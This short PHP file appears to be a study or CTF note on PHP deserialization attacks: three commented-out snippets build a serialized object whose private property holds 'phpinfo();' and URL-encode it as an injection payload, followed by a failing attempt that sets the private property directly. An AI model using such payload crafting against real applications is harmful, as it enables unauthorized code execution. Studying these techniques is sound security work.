<?php
highlight_file(__FILE__);
#payload 1
// class Test
// {
// private $test;
// public function __construct($test){
// $this->test = $test;
// }
// }
// $a = new Test('phpinfo();');
// echo urlencode(serialize($a));


#payload 2
// class Test
// {
// private $test;
// public function __construct(){
// $this->test = 'phpinfo();';
// }
// }
// $a = new Test();
// echo urlencode(serialize($a));


#payload 3
// class Test
// {
// private $test='phpinfo();';
// }
// $a = new Test();
// echo urlencode(serialize($a));


//error
class Test
{
   private $test;
   public function __construct($test){
       $this->test = $test;
   }
}
$a = new Test($test);
$a->test='phpinfo();';          // Cannot access private property
echo urlencode(serialize($a));
